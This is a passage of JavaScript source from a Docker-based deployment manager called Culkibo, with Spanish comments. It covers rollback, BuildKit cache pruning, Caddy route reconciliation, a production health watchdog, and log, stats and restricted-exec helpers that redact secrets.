          hostPort: hist.hostPort,
          containerPort: hist.containerPort || DEFAULTS.containerPort,
          upstream: hist.upstream,
          healthPath: hist.strategy?.healthPath || DEFAULTS.healthPath,
          hostnames: hist.hostnames || [],
          git: hist.git || null
        };
      }
    }
    if (!target) {
      throw new Error('No hay ninguna versión anterior a la que volver');
    }

    // Clonar target para no mutar state.previous si necesitamos recrear contenedor desde imagen
    target = { ...target };

    const pm = getProjectManager();
    const liveProject = pm && typeof pm.getById === 'function' ? pm.getById(projectId) : null;
    const liveHostnames = liveProject ? this.hostnamesFor(liveProject) : (target.hostnames || []);

    /** @type {any} */
    const record = {
      id: `rbk_${Date.now()}_${crypto.randomBytes(3).toString('hex')}`,
      projectId,
      projectName: (liveProject && liveProject.name) || (current && current.projectName) || projectId,
      status: 'promocionando',
      kind: 'rollback',
      imageTag: target.imageTag,
      containerName: target.containerName,
      hostPort: target.hostPort,
      containerPort: target.containerPort,
      upstream: target.upstream,
      hostnames: liveHostnames.length > 0 ? liveHostnames : (target.hostnames || []),
      routeSwitched: false,
      git: target.git || null,
      trigger: options.trigger || 'manual',
      previous: current ? { ...current } : null,
      startedAt: new Date().toISOString(),
      finishedAt: null,
      durationMs: null,
      error: null,
      logLines: []
    };
    state.history.unshift(record);
    if (state.history.length > 20) state.history.pop();

    const started = Date.now();
    /** @param {string} status @param {string | null} [error] */
    const finish = (status, error = null) => {
      record.finishedAt = new Date().toISOString();
      record.durationMs = Date.now() - started;
      record.error = error;
      this.setStatus(record, status);
      this.saveStore();
      if (status === 'fallido') {
        this.notify({
          event: 'rollback',
          level: 'error',
          title: 'Rollback fallido',
          message: `${record.projectName}: no se pudo volver a ${target.imageTag}. ${String(error || '').slice(0, 400)}`,
          projectId,
          projectName: record.projectName
        });
      }
      return record;
    };

    // P0: cancelar drenaje y proteger el contenedor destino ANTES de inspeccionar/conmutar
    this.cancelContainerDrain(target.containerName);
    this.inFlightContainers.add(target.containerName);

    let recreatedFromImage = false;
    try {
      const docker = await this.detectDocker({ force: true });
      if (!docker.available) return finish('fallido', docker.reason);

      const running = await this.runDocker(['inspect', '-f', '{{.State.Running}}', target.containerName], { timeoutMs: 8000 });
      let needsRecreate = running.code !== 0;
      let startedExisting = false;

      if (!needsRecreate && (running.stdout || '').trim() !== 'true') {
        this.log(record, 'INFO', `Arrancando la versión anterior ${target.containerName}...`);
        const start = await this.runDocker(['start', target.containerName], { timeoutMs: 30000 });
        if (start.code !== 0) {
          const msg = start.stderr.trim() || `docker start terminó con código ${start.code}`;
          if (/port is already allocated|address already in use/i.test(msg) && options.recreateOnMissing !== false && target.imageTag) {
            this.log(record, 'WARN', `Puerto ocupado al arrancar ${target.containerName}; recreando contenedor desde la imagen ${target.imageTag}...`);
            needsRecreate = true;
          } else {
            this.log(record, 'ERROR', `No se pudo arrancar la versión anterior: ${msg}`);
            return finish('fallido', msg);
          }
        } else {
          startedExisting = true;
        }
      } else if (!needsRecreate) {
        this.log(record, 'INFO', 'La versión anterior sigue viva dentro de su ventana de drenaje: el rollback es solo un cambio de ruta');
      }

      // Auto-recuperación desde imagen Docker local si el contenedor antiguo fue eliminado o colisionó puerto
      if (needsRecreate) {
        if (options.recreateOnMissing === false || !target.imageTag) {
          const msg = `El contenedor de la versión anterior (${target.containerName}) ya no existe; no se puede revertir sin reconstruir`;
          this.log(record, 'ERROR', msg);
          return finish('fallido', msg);
        }
        const imgCheck = await this.runDocker(['image', 'inspect', target.imageTag], { timeoutMs: 8000 });
        if (imgCheck.code !== 0) {
          const msg = `El contenedor (${target.containerName}) y su imagen (${target.imageTag}) ya no existen; no se puede revertir sin reconstruir`;
          this.log(record, 'ERROR', msg);
          return finish('fallido', msg);
        }

        await this.ensureNetwork(opts.network);
        const newPort = await this.findFreePort(20000, record.id);
        const newName = `culkibo_${safeSlug(projectId)}_rbk_${crypto.randomBytes(3).toString('hex')}`;
        const linkedDb = liveProject ? this.resolveLinkedDatabases(liveProject) : { injectedEnv: {}, networks: [], secretValues: [] };
        const envVars = { ...linkedDb.injectedEnv, ...((liveProject && liveProject.envVars) || {}) };
        const envNames = Object.keys(envVars).filter(isValidEnvName).filter((k) => !HOST_HIJACK_ENV_BLOCKLIST.has(k.toUpperCase()));
        const containerPort = target.containerPort || (liveProject && liveProject.containerPort) || DEFAULTS.containerPort;
        const runArgs = this.runArgs({
          containerName: newName,
          imageTag: target.imageTag,
          hostPort: newPort,
          containerPort,
          envNames,
          network: opts.network,
          memoryMb: (liveProject && Number(liveProject.memoryMb)) || opts.memoryMb,
          cpus: (liveProject && liveProject.cpus) || opts.cpus,
          pidsLimit: opts.pidsLimit,
          labels: {
            'culkibo.managed': 'true',
            'com.culkibo.project': safeSlug(projectId),
            'com.culkibo.project_id': projectId,
            'com.culkibo.deployment': record.id
          }
        });
        this.inFlightContainers.add(newName);
        const runRes = await this.runDocker(runArgs, { timeoutMs: 60000, env: { ...process.env, ...filterSafeHostEnv(envVars) } });
        portRegistry.release(newPort, record.id);
        if (runRes.code !== 0) {
          const msg = (runRes.stderr || '').trim() || `docker run falló en rollback (${runRes.code})`;
          this.log(record, 'ERROR', msg);
          this.inFlightContainers.delete(newName);
          return finish('fallido', msg);
        }
        for (const dbNet of linkedDb.networks) {
          if (dbNet !== opts.network) {
            await this.runDocker(['network', 'connect', dbNet, newName], { timeoutMs: 10000 }).catch(() => {});
          }
        }
        const up = await this.resolveUpstream({ containerName: newName, containerPort, hostPort: newPort, network: opts.network });
        target.containerName = newName;
        target.hostPort = newPort;
        target.containerPort = containerPort;
        target.upstream = up.dial;
        record.containerName = newName;
        record.hostPort = newPort;
        record.upstream = up.dial;
        recreatedFromImage = true;
        startedExisting = true;
      }

      if (startedExisting) {
        const health = await this.waitForHealth({
          hostPort: target.hostPort,
          containerPort: target.containerPort,
          healthPath: target.healthPath || DEFAULTS.healthPath,
          containerName: target.containerName,
          timeoutMs: opts.healthTimeoutMs,
          intervalMs: opts.healthIntervalMs,
          onProgress: (m) => this.log(record, 'INFO', m)
        });
        if (!health.healthy) {
          const msg = `La versión anterior tampoco pasó la verificación de salud: ${health.reason}`;
          this.log(record, 'ERROR', msg);
          // Detener (o eliminar si fue recién recreado) para no dejar contenedores rotos en crash-loop
          if (recreatedFromImage) {
            await this.runDocker(['rm', '-f', target.containerName], { timeoutMs: 15000 }).catch(() => {});
          } else {
            await this.runDocker(['stop', '--time', '5', target.containerName], { timeoutMs: 15000 }).catch(() => {});
          }
          return finish('fallido', msg);
        }
        this.log(record, 'SUCCESS', `Versión anterior sana (HTTP ${health.status})`);
      }

      const hostnames = record.hostnames;
      if (hostnames.length > 0) {
        const switched = await this.switchRoute(record, hostnames, target.upstream, liveProject);
        if (!switched.ok) {
          if (recreatedFromImage) {
            await this.runDocker(['rm', '-f', target.containerName], { timeoutMs: 15000 }).catch(() => {});
          }
          return finish('fallido', switched.error);
        }
      } else {
        this.log(record, 'WARN', 'Sin dominios asignados: no hay ninguna ruta que conmutar');
      }

      target.status = 'activo';
      target.hostnames = hostnames;
      state.current = target;
      state.previous = current || null;
      this.saveStore();

      if (current && current.containerName !== target.containerName) {
        const drain = this.drainAndRetire(record, current, opts)
          .catch(err => this.log(record, 'WARN', `Fallo al retirar ${current.containerName}: ${err.message}`))
          .finally(() => { if (this.drains.get(projectId) === drain) this.drains.delete(projectId); });
        this.drains.set(projectId, drain);
      }

      this.log(record, 'SUCCESS', `Rollback completado: sirviendo ${target.imageTag}`);
      this.notify({
        event: 'rollback',
        level: 'warning',
        title: 'Rollback ejecutado',
        message: `${record.projectName} ha vuelto a ${target.imageTag}.`,
        projectId,
        projectName: record.projectName
      });
      return finish('activo');
    } catch (err) {
      this.log(record, 'ERROR', `Error inesperado en el rollback: ${err.message}`);
      return finish('fallido', err.message);
    } finally {
      this.inFlightContainers.delete(target.containerName);
    }
  }

  /** Espera al drenaje en curso. Lo usan las pruebas y el apagado ordenado. */
  async awaitDrain(projectId) {
    const drain = this.drains.get(projectId);
    if (drain) await drain;
  }

  // -------------------------------------------------------------------------
  // 7. Estado y mantenimiento
  // -------------------------------------------------------------------------

  async status(projectId) {
    const state = this.getState(projectId);
    const docker = await this.detectDocker();
    /** @type {any} */
    let containerState = null;
    if (docker.available && state.current) {
      const res = await this.runDocker(
        ['inspect', '-f', '{{.State.Status}}|{{if .State.Health}}{{.State.Health.Status}}{{else}}sin-healthcheck{{end}}', state.current.containerName],
        { timeoutMs: 8000 }
      );
      if (res.code === 0) {
        const [status, health] = (res.stdout || '').trim().split('|');
        containerState = { status, health };
      }
    }
    const last = state.history[0] || null;
    return {
      docker,
      current: state.current,
      previous: state.previous,
      canRollback: Boolean(state.previous),
      containerState,
      // Sin esto el panel no puede distinguir «no hay despliegue» de «hay uno
      // a medio construir», que es justo cuando el usuario mira la pantalla.
      inProgress: this.locks.has(projectId),
      queued: this.pending.has(projectId),
      queue: this.getQueueStatus(),
      lastDeployment: last ? { ...last, logLines: undefined, logLineCount: (last.logLines || []).length } : null
    };
  }

  /**
   * Poda de la caché de construcción de BuildKit.
   *
   * BuildKit tiene un recolector propio que `docker system prune` NO gobierna.
   * Sus valores por defecto, leídos del código de moby
   * (`daemon/internal/builder-next/worker/gc.go`) para el BuildKit embebido en
   * dockerd, que es el que usa un `docker build` normal:
   *
   *   - política 1 — `source.local`, `exec.cachemount`, `source.git.checkout`:
   *     KeepDuration = 48 h, MaxUsedSpace = max(10 % del disco x 13,8 %, 512 MB)
   *   - política 2 — todo lo demás: KeepDuration = 60 DÍAS (1440 h)
   *   - políticas 3 y 4: solo topes de espacio
   *   - topes por defecto: reservado 10 % del disco (mínimo 2 GB),
   *     máximo usado 80 %, libre mínimo 20 %
   *
   * Es decir: el famoso «48 h» existe, pero solo aplica a los tipos de caché
   * baratos de reproducir. La caché general se conserva 60 días. Y se configura
   * en `/etc/docker/daemon.json` bajo `builder.gc`, NO en
   * `/etc/buildkit/buildkitd.toml` — ese fichero solo afecta a un buildkitd
   * independiente (drivers `docker-container`, `remote`, `kubernetes`), y
   * confundirlos es escribir una política que no se aplica nunca.
   *
   * Qué debería hacer Culkibo con esto:
   *   1. NO podar automáticamente después de cada despliegue. Eso es
   *      destruirse la caché a mano y volver a los 4,5 minutos de build de
   *      Coolify por otra vía.
   *   2. Gobernar por ESPACIO, no por antigüedad: lo que tumba un VPS de 40 GB
   *      es el disco lleno, no una capa de hace tres semanas.
   *   3. Dejarlo en manos del operador —esta función— y poder programarlo.
   *   4. A medio plazo, escribir `builder.gc.policy` en daemon.json durante la
   *      instalación para que el tope por defecto no sea el 80 % del disco en
   *      una máquina que además aloja las aplicaciones. Pendiente.
   *
   * Nota de CLI: `docker builder prune` acepta `--keep-storage`. En
   * `docker buildx prune` ese flag está deprecado a favor de
   * `--reserved-space`. Aquí se usa el primero, que es el del CLI base.
   */
  async pruneBuildCache({ keepStorageGb = 10, untilHours = null } = {}) {
    const docker = await this.detectDocker();
    if (!docker.available) return { ok: false, error: docker.reason };

    const gb = Number(keepStorageGb);
    if (!Number.isFinite(gb) || gb < 0 || gb > 10000) {
      return { ok: false, error: 'keepStorageGb debe ser un número entre 0 y 10000' };
    }

    const args = ['builder', 'prune', '--force', '--keep-storage', `${Math.round(gb)}GB`];
    if (untilHours != null) {
      const hours = Number(untilHours);
      if (!Number.isFinite(hours) || hours <= 0 || hours > 8760) {
        return { ok: false, error: 'untilHours debe ser un número entre 1 y 8760' };
      }
      args.push('--filter', `until=${Math.round(hours)}h`);
    }

    const res = await this.runDocker(args, { timeoutMs: 120000 });
    return res.code === 0
      ? { ok: true, output: (res.stdout || '').trim().slice(0, 2000) }
      : { ok: false, error: (res.stderr || '').trim().slice(0, 600) };
  }

  /**
   * Reconstruye las rutas de Caddy a partir de lo que Culkibo cree que está
   * desplegado. Se llama al arrancar el daemon: si Caddy se reinició y perdió
   * su configuración, el estado real vuelve a converger con el modelo. Dokploy
   * tiene un fallo abierto justo por no hacer esto: tras un reinicio sucio los
   * adjuntos de red no se reaplican y el modelo y la realidad divergen en
   * silencio.
   *
   * ADITIVA a propósito, a diferencia de `caddyManager.reconcile()`: aquí solo
   * se reponen las rutas de nuestros despliegues, nunca se borra ninguna. Una
   * ruta que Culkibo no reconoce puede ser de un despliegue anterior a este
   * proceso o algo que el operador puso a mano; arrancar el daemon no es momento
   * de tirar tráfico ajeno. La poda destructiva sigue disponible, explícita, en
   * `caddyManager.reconcile()`.
   */
  async reconcileRoutes() {
    /** @type {any[]} */
    const specs = [];
    const pm = getProjectManager();
    let needsCaddyNetwork = false;
    for (const [projectId, state] of Object.entries(this.store)) {
      const liveProject = pm && typeof pm.getById === 'function' ? pm.getById(projectId) : null;
      if (liveProject && liveProject.maintenanceMode) continue;
      if (
        state.current &&
        state.current.upstream &&
        state.current.status !== 'detenido' &&
        state.current.status !== 'stopped' &&
        (state.current.hostnames || []).length > 0
      ) {
        if (!String(state.current.upstream).startsWith('127.0.0.1:') && !String(state.current.upstream).startsWith('host.docker.internal:')) {
          needsCaddyNetwork = true;
        }
        specs.push({ projectId, hostnames: state.current.hostnames, upstreams: [state.current.upstream] });
      }
    }
    if (specs.length === 0) return { applied: [], skipped: 'no hay despliegues con dominio' };

    if (needsCaddyNetwork) {
      // Garantizar que culkibo-caddy siga conectado a la red Docker tras un reinicio/compose up
      await this.runDocker(['network', 'connect', DEFAULTS.network, DEFAULTS.caddyContainerName], { timeoutMs: 8000 }).catch(() => {});
    }

    const detection = await caddyManager.detect({ force: true });
    if (!detection.available) return { applied: [], skipped: detection.reason };

    if (typeof caddyManager.upsertRoutesBatch === 'function') {
      const batch = await caddyManager.upsertRoutesBatch(specs);
      return { applied: batch.applied || [], failed: batch.failed || [] };
    }

    /** @type {string[]} */
    const applied = [];
    /** @type {any[]} */
    const failed = [];
    for (const spec of specs) {
      try {
        const result = await caddyManager.upsertRoute(spec);
        applied.push(result.id);
      } catch (err) {
        failed.push({ projectId: spec.projectId, error: err.message });
      }
    }
    return { applied, failed };
  }

  /**
   * Watchdog de producción: detecta contenedores OOMKilled, desaparecidos o en crash-loop
   * (`RestartCount >= 3`) en una sola llamada `docker inspect`, tolera fallos parciales,
   * aplica cooldown anti-spam (10 min) y protege contra ping-pong A<->B de auto-rollback.
   */
  async checkProductionHealth() {
    const docker = await this.detectDocker();
    if (!docker.available) return { checked: 0, incidents: [] };

    /** @type {Array<{ projectId: string, state: any }>} */
    const active = [];
    for (const [projectId, state] of Object.entries(this.store)) {
      if (state && state.current && state.current.containerName && state.current.status !== 'detenido' && state.current.status !== 'stopped') {
        active.push({ projectId, state });
      }
    }
    if (active.length === 0) return { checked: 0, incidents: [] };

    const names = active.map((a) => a.state.current.containerName);
    const res = await this.runDocker(
      ['inspect', '-f', '{{.Name}}|{{.State.Running}}|{{.State.OOMKilled}}|{{.RestartCount}}|{{.State.Status}}', ...names],
      { timeoutMs: 10000 }
    );
    // Docker imprime en stdout todos los contenedores que sí existen aunque alguno falte (exit 1).
    const byName = new Map();
    for (const line of (res.stdout || '').split(/\r?\n/).map((s) => s.trim()).filter(Boolean)) {
      const [rawName, running, oomKilled, restartCount, status] = line.split('|');
      byName.set(rawName.replace(/^\//, ''), {
        running: running === 'true',
        oomKilled: oomKilled === 'true',
        restartCount: parseInt(restartCount || '0', 10) || 0,
        status: status || 'unknown'
      });
    }
    // Si falló totalmente sin salida útil (daemon Docker caído), abortar sin falsos positivos
    if (res.code !== 0 && byName.size === 0 && !/no such/i.test(res.stderr || '')) {
      return { checked: active.length, incidents: [], error: (res.stderr || '').trim().slice(0, 200) };
    }

    /** @type {any[]} */
    const incidents = [];
    const pm = getProjectManager();
    const now = Date.now();
    const COOLDOWN_MS = 10 * 60 * 1000;

    for (const { projectId, state } of active) {
      const cName = state.current.containerName;
      const info = byName.get(cName) || {
        running: false,
        oomKilled: false,
        restartCount: 0,
        status: 'missing'
      };
      const degraded = info.oomKilled || info.restartCount >= 3 || (!info.running && info.status !== 'created');
      if (!degraded) {
        this._incidentCooldown.delete(cName);
        continue;
      }

      const reason = info.status === 'missing'
        ? `Contenedor ${cName} desaparecido del host Docker`
        : info.oomKilled
          ? 'Contenedor terminado por falta de memoria (OOMKilled)'
          : info.restartCount >= 3
            ? `Crash-loop detectado (${info.restartCount} reinicios)`
            : `Contenedor detenido inesperadamente (${info.status})`;

      const project = pm && typeof pm.getById === 'function' ? pm.getById(projectId) : null;
      let cd = this._incidentCooldown.get(cName);
      if (!cd) {
        cd = { lastNotifiedAt: 0, rolledBackPairs: new Set() };
        this._incidentCooldown.set(cName, cd);
      }

      const pairKey = `${state.current.deploymentId || cName}->${state.previous?.deploymentId || state.previous?.containerName || 'none'}`;
      const canAutoRollback = Boolean(
        project &&
        project.autoRollback &&
        state.previous &&
        !this.locks.has(projectId) &&
        !cd.rolledBackPairs.has(pairKey)
      );

      incidents.push({ projectId, containerName: cName, reason, autoRollback: canAutoRollback, ...info });
      this.emit('production_unhealthy', { projectId, containerName: cName, reason, ...info });

      if (now - cd.lastNotifiedAt >= COOLDOWN_MS || canAutoRollback) {
        cd.lastNotifiedAt = now;
        this.notify({
          event: 'production_unhealthy',
          level: 'error',
          title: `Incidente en producción: ${state.current.projectName || projectId}`,
          message: canAutoRollback ? `${reason}. Iniciando auto-rollback a ${state.previous.imageTag}.` : reason,
          projectId,
          projectName: state.current.projectName || projectId
        });
      }

      if (canAutoRollback) {
        cd.rolledBackPairs.add(pairKey);
        this.rollback(projectId, { trigger: 'auto-rollback' }).catch(() => {});
      }
    }

    return { checked: active.length, incidents };
  }

  /** Detiene el servicio de producción de un proyecto sin borrar nada (serializado por lock). */
  async stopProduction(projectOrId) {
    const projectId = (projectOrId && typeof projectOrId === 'object') ? projectOrId.id : projectOrId;
    if (!projectId || typeof projectId !== 'string') throw new Error('Proyecto inválido');
    if (this.locks.has(projectId)) {
      throw new Error('Hay un despliegue en curso para este proyecto; espera a que termine antes de detenerlo');
    }
    const task = (async () => {
      this.cancelDrain(projectId);
      const state = this.getState(projectId);
      if (!state.current) return { stopped: false, reason: 'Este proyecto no tiene ningún despliegue activo' };
      try { await caddyManager.removeRoute(projectId); } catch (e) {}
      const res = await this.runDocker(['stop', '--time', String(DEFAULTS.stopGraceSeconds), state.current.containerName], { timeoutMs: 40000 });
      if (res.code === 0) {
        state.current.status = 'detenido';
        this.saveStore();
        this.notify({
          event: 'project_stopped',
          level: 'info',
          title: `Servicio detenido: ${state.current.projectName || projectId}`,
          message: `El contenedor de producción ${state.current.containerName} fue detenido manualmente.`,
          projectId,
          projectName: state.current.projectName || projectId
        });
      }
      return { stopped: res.code === 0, containerName: state.current.containerName, error: res.code === 0 ? null : res.stderr.trim() };
    })().finally(() => {
      if (this.locks.get(projectId) === task) this.locks.delete(projectId);
      // Nunca re-desplegar un push encolado justo después de parar el servicio manualmente
      this.pending.delete(projectId);
    });
    this.locks.set(projectId, task);
    return task;
  }

  /**
   * Vuelve a levantar el servicio que `stopProduction()` paró (serializado por lock).
   */
  async startProduction(projectOrId, options = {}) {
    const projectId = (projectOrId && typeof projectOrId === 'object') ? projectOrId.id : projectOrId;
    if (!projectId || typeof projectId !== 'string') throw new Error('Proyecto inválido');
    if (this.locks.has(projectId)) {
      throw new Error('Hay un despliegue en curso para este proyecto; espera a que termine antes de arrancarlo');
    }
    const task = (async () => {
      const opts = { ...DEFAULTS, ...options };
      const state = this.getState(projectId);
      if (!state.current) return { started: false, reason: 'Este proyecto no tiene ningún despliegue activo' };

      const docker = await this.detectDocker({ force: true });
      if (!docker.available) return { started: false, reason: docker.reason };

      const target = state.current;
      const start = await this.runDocker(['start', target.containerName], { timeoutMs: 40000 });
      if (start.code !== 0) {
        return {
          started: false,
          containerName: target.containerName,
          error: (start.stderr || '').trim() || `docker start terminó con código ${start.code}`
        };
      }

      const health = await this.waitForHealth({
        hostPort: target.hostPort,
        containerPort: target.containerPort,
        healthPath: target.healthPath || DEFAULTS.healthPath,
        containerName: target.containerName,
        timeoutMs: opts.healthTimeoutMs,
        intervalMs: opts.healthIntervalMs,
        onProgress: null
      });
      if (!health.healthy) {
        // Detener contenedor fallido para no dejarlo en crash-loop bajo --restart unless-stopped
        await this.runDocker(['stop', '--time', '5', target.containerName], { timeoutMs: 15000 }).catch(() => {});
        return {
          started: false,
          containerName: target.containerName,
          error: `El contenedor arrancó pero no pasó la verificación de salud: ${health.reason}`
        };
      }

      target.status = 'activo';
      this.saveStore();

      if ((target.hostnames || []).length > 0 && target.upstream) {
        const fakeDep = { projectId, projectName: target.projectName || projectId, logLines: [] };
        const switched = await this.switchRoute(fakeDep, target.hostnames, target.upstream);
        if (!switched.ok) {
          return {
            started: true,
            routeRestored: false,
            containerName: target.containerName,
            error: `El servicio está arriba, pero no se pudo reponer la ruta: ${switched.error}`
          };
        }
      }

      return { started: true, routeRestored: true, containerName: target.containerName, error: null };
    })().finally(() => {
      if (this.locks.get(projectId) === task) this.locks.delete(projectId);
      this.drainPending(projectId);
    });
    this.locks.set(projectId, task);
    return task;
  }

  // -------------------------------------------------------------------------
  // 8. Logs en vivo, estadísticas y ejecución segura en contenedor de producción
  // -------------------------------------------------------------------------

  _secretValuesForProject(projectId) {
    const pm = getProjectManager();
    const project = pm && typeof pm.getById === 'function' ? pm.getById(projectId) : null;
    if (!project) return [];
    const linked = this.resolveLinkedDatabases(project);
    return [
      ...Object.values(project.envVars || {}),
      ...Object.values(project.buildArgs || {}),
      ...linked.secretValues
    ];
  }

  /** Obtiene los últimos logs del contenedor de producción (actual o anterior), con secretos redactados. */
  async getRuntimeLogs(projectId, { tail = 200, since = null, timestamps = true, target = 'current' } = {}) {
    const state = this.getState(projectId);
    const release = target === 'previous' ? state.previous : state.current;
    if (!release || !release.containerName) {
      return {
        ok: false,
        running: false,
        containerName: null,
        error: `No hay contenedor de producción (${target}) para este proyecto`,
        lines: [],
        output: ''
      };
    }
    const safeTail = Math.min(5000, Math.max(1, parseInt(String(tail || 200), 10) || 200));
    const args = ['logs', '--tail', String(safeTail)];
    if (timestamps) args.push('--timestamps');
    if (since) {
      const cleanSince = String(since).trim();
      if (!/^(\d+[smhd]|\d{4}-\d{2}-\d{2}T[\d:.+-Z]+)$/.test(cleanSince)) {
        return { ok: false, status: 400, error: 'Parámetro since inválido (usa p. ej. 15m, 1h o ISO-8601)', lines: [] };
      }
      args.push('--since', cleanSince);
    }
    args.push(release.containerName);

    const res = await this.runDocker(args, { timeoutMs: 15000 });
    const secrets = this._secretValuesForProject(projectId);
    const combined = [res.stdout, res.stderr]
      .filter(Boolean)
      .join('\n')
      .split(/\r?\n/)
      .filter(Boolean)
      .map((line) => this.redact(line, secrets));
    if (timestamps) combined.sort();

    return {
      ok: res.code === 0,
      containerName: release.containerName,
      target,
      tail: safeTail,
      lines: combined,
      error: res.code === 0 ? null : this.redact((res.stderr || '').trim().slice(0, 300), secrets)
    };
  }

  /**
   * Inicia un stream `docker logs -f` seguro con límite global de streams simultáneos.
   * @param {string} projectId
   * @param {{ tail?: number | string, target?: string, onLine?: ((payload: { stream: string, line: string }) => void) | null, onEnd?: ((code: number | null) => void) | null }} [opts]
   */
  streamRuntimeLogs(projectId, { tail = 100, target = 'current', onLine = null, onEnd = null } = {}) {
    const state = this.getState(projectId);
    const release = target === 'previous' ? state.previous : state.current;
    if (!release || !release.containerName) {
      const err = new Error(`No hay contenedor de producción (${target}) para este proyecto`);
      /** @type {any} */ (err).status = 404;
      throw err;
    }
    if (this._activeLogStreams >= MAX_RUNTIME_LOG_STREAMS) {
      const err = new Error(`Límite global de ${MAX_RUNTIME_LOG_STREAMS} streams de logs simultáneos alcanzado`);
      /** @type {any} */ (err).status = 503;
      throw err;
    }

    const safeTail = Math.min(2000, Math.max(1, parseInt(String(tail || 100), 10) || 100));
    const secrets = this._secretValuesForProject(projectId);
    const child = spawn(
      'docker',
      ['logs', '-f', '--tail', String(safeTail), '--timestamps', release.containerName],
      { shell: false, windowsHide: true }
    );
    this._activeLogStreams++;
    let closed = false;

    const closeStream = () => {
      if (closed) return;
      closed = true;
      this._activeLogStreams = Math.max(0, this._activeLogStreams - 1);
      try { child.kill('SIGTERM'); } catch (e) {}
      const esc = setTimeout(() => { try { child.kill('SIGKILL'); } catch (e) {} }, 3000);
      if (esc.unref) esc.unref();
    };

    const pump = (streamName) => {
      let buf = '';
      return (chunk) => {
        buf += chunk.toString();
        const parts = buf.split(/\r?\n/);
        buf = parts.pop() || '';
        for (const raw of parts) {
          if (raw && onLine) onLine({ stream: streamName, line: this.redact(raw, secrets) });
        }
      };
    };
    child.stdout.on('data', pump('stdout'));
    child.stderr.on('data', pump('stderr'));
    child.on('close', (code) => {
      closeStream();
      if (onEnd) onEnd(code);
    });
    child.on('error', () => {
      closeStream();
      if (onEnd) onEnd(-1);
    });

    return { containerName: release.containerName, close: closeStream };
  }

  /** Estadísticas en directo del contenedor de producción (CPU, RAM, PIDs, red, reinicios, OOM). */
  async getRuntimeStats(projectId) {
    const state = this.getState(projectId);
    const release = state.current;
    if (!release || !release.containerName) {
      return {
        ok: false,
        running: false,
        containerName: null,
        error: 'No hay contenedor de producción activo para este proyecto'
      };
    }
    const [insp, st] = await Promise.all([
      this.runDocker(
        ['inspect', '-f', '{{.State.Status}}|{{.State.Running}}|{{.State.OOMKilled}}|{{.RestartCount}}|{{.State.StartedAt}}|{{if .State.Health}}{{.State.Health.Status}}{{else}}none{{end}}', release.containerName],
        { timeoutMs: 8000 }
      ),
      this.runDocker(['stats', '--no-stream', '--format', '{{json .}}', release.containerName], { timeoutMs: 10000 })
    ]);
    if (insp.code !== 0) {
      return {
        ok: false,
        running: false,
        containerName: release.containerName,
        error: `Contenedor ${release.containerName} no encontrado en Docker`
      };
    }
    const [status, running, oomKilled, restartCount, startedAt, health] = (insp.stdout || '').trim().split('|');
    /** @type {any} */
    let statsObj = null;
    if (st.code === 0 && (st.stdout || '').trim()) {
      try { statsObj = JSON.parse((st.stdout || '').trim().split(/\r?\n/)[0]); } catch (e) {}
    }
    return {
      ok: true,
      containerName: release.containerName,
      imageTag: release.imageTag,
      status,
      running: running === 'true',
      oomKilled: oomKilled === 'true',
      restartCount: parseInt(restartCount || '0', 10) || 0,
      startedAt,
      health,
      cpuPercent: statsObj?.CPUPerc || null,
      memUsage: statsObj?.MemUsage || null,
      memPercent: statsObj?.MemPerc || null,
      netIO: statsObj?.NetIO || null,
      blockIO: statsObj?.BlockIO || null,
      pids: statsObj?.PIDs || null
    };
  }

  /**
   * Ejecuta un comando de inspección puntual dentro del contenedor de producción (sin shell, redactado).
   * @param {string} projectId
   * @param {{ command?: string | string[], workdir?: string | null, timeoutMs?: number }} [opts]
   */
  async execInContainer(projectId, { command = '', workdir = null, timeoutMs = 30000 } = {}) {
    if (process.env.CULKIBO_ALLOW_EXEC === '0') {
      const err = new Error('La ejecución puntual en contenedores está deshabilitada (CULKIBO_ALLOW_EXEC=0)');
      /** @type {any} */ (err).status = 403;
      throw err;
    }
    const state = this.getState(projectId);
    const release = state.current;
    if (!release || !release.containerName) {
      const err = new Error('No hay contenedor de producción activo para este proyecto');
      /** @type {any} */ (err).status = 404;
      throw err;
    }
    const argv = parseSafeCommandArgv(command);
    const cleanWorkdir = sanitizeWorkdir(workdir);
    const safeTimeout = Math.min(120000, Math.max(1000, Number(timeoutMs) || 30000));
    const args = ['exec'];
    if (cleanWorkdir) args.push('-w', cleanWorkdir);
    args.push(release.containerName, ...argv);

    const started = Date.now();
    const res = await this.runDocker(args, { timeoutMs: safeTimeout });
    const secrets = this._secretValuesForProject(projectId);
    const cap = 64 * 1024;
    const stdout = this.redact((res.stdout || '').slice(0, cap), secrets);
    const stderr = this.redact((res.stderr || '').slice(0, cap), secrets);

    if (containerOrchestrator && typeof containerOrchestrator.addLog === 'function') {
      containerOrchestrator.addLog('INFO', `[Exec] ${release.containerName}: ${argv.join(' ')} (exit ${res.code})`, projectId);
    }

    return {
      ok: res.code === 0,
      exitCode: res.code,
      timedOut: Boolean(res.timedOut),
      durationMs: Date.now() - started,
      containerName: release.containerName,
      command: argv,
      stdout,
      stderr
    };
  }
}

// La instancia es el export principal; la clase y los ayudantes cuelgan de
// ella para que las pruebas puedan crear instancias aisladas sin disco.
const instance = /** @type {any} */ (new DeployManager());
instance.DeployManager = DeployManager;
instance.DEFAULTS = DEFAULTS;
instance.helpers = { safeSlug, isValidEnvName, sanitizeHealthPath, sanitizeNodeMajor, sanitizePort, filterSafeHostEnv };

module.exports = instance;
